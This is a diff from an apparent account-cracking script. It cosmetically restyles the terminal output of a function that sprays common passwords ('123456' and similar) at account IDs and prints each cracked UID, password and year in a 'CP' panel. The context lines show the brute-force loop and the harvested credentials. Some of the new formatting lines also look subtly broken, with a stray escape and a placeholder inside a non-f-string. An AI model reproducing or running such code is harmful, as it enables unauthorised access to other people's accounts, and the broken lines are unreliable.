@@ -423,16 +423,9 @@ def login_1(uid):
     session = requests.session()
     try:
         sys.stdout.write(
-            f"\r\r\x1b[1;37m>\x1b[38;5;196m+\x1b[1;37m<"
-            f"\x1b[38;5;196m(\x1b[1;37m🌏PRDS🧬"
-            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
-            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}"
-            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
-            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK"
-            f"\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×"
-            f"\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}"
-            f"\x1b[38;5;196m)"
-        )
+            f"\r\r\{U}🌏PRDS🧬"
+            f"{b}~{WH}{loop}{b}~"
+            f"{b}~{WH}OK {len(oks)}{b}~")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -615,12 +608,12 @@ def login_1(uid):
 
                 # ================= PANEL CP BARU =====================
                 print("\n\033[91m┌" + "─" * 52 + "┐")
-                print("│\033[93m             ⚠️ CROOT DEK              \033[91m│")
+                print("│{H}                      ⚠️ CROOT DEK                      \033[91m│")
                 print("├" + "─" * 52 + "┤")
                 print(f"│ \033[97mUID      : \033[93m{uid:<40}\033[91m│")
                 print(f"│ \033[97mPASS     : \033[93m{pw:<40}\033[91m│")
                 print(f"│ \033[97mYEAR     : \033[93m{str(year):<40}\033[91m│")
-                print(f"│ \033[97mSTATUS   : \033[91mMUNCRATDEK{' ' * 30}│")
+                print(f"│ \033[97mSTATUS   : {CY}MUNCRATDEK{' ' * 30}│")
                 print(f"│ \033[97mUSER-AG  : \033[93m{ua[:40]:<40}\033[91m│")
                 print("└" + "─" * 52 + "┘\033[0m\n")
     
